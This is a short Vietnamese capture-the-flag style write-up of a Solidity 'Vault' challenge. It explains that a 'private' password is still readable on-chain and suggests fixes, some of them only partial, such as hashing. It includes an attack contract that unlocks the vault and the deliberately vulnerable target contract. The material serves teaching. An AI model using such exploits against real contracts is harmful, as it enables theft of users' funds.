### Kết luận
- Lỗ hổng: Lưu password dưới dạng dữ liệu công khai trong blockchain, dễ dàng bị đọc và khai thác.
- Cách phòng: Cần thêm một số `modifiers`, `require` chặt hơn, ẩn hoặc mã hóa các dữ liệu quan trọng (`password`) bằng  cách sử dụng `keccak256(abi.encodePacked(_password)`, hoặc có thể giới hạn số lần thử `attempt <= 3` hoặc
kiểm tra logging.
### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
import './vault.sol';
pragma solidity ^0.8.0;
interface IVault{
    function unlock(bytes32 _password) external;
}
contract VaultAttack{
    IVault public challenge;
    constructor (address _victim){
        challenge = IVault(_victim);
    }
    function attack(bytes32 _password) external {
        challenge.unlock(_password);
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```
